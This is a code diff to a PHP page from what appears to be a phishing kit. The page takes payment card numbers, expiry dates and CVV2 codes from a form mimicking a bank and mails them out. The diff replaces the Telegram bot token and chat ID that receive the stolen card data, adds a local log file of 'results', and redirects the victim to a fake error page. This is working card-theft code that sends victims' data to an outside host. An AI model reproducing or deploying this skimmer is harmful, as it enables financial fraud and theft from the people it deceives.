@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 session_start();
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
@@ -31,9 +31,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 			$headers .= "MIME-Version: 1.0\r\n";
 			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 			mail($to, $subject, $message, $headers);
-            file_get_contents("https://api.telegram.org/bot2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo/sendMessage?chat_id=-745387116&text=" . urlencode($message)."" );
-		
-        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
-    }
-}
+           $token = "1444398777:AAGLFUEgpwuJDL5EFSGP7NZuWfTtwNhEb0g";
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1208803924&text=" . urlencode($message)."" );
+$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
+fwrite($file,$message); 
+
+header("Location: codeerror.php");
+
 ?>
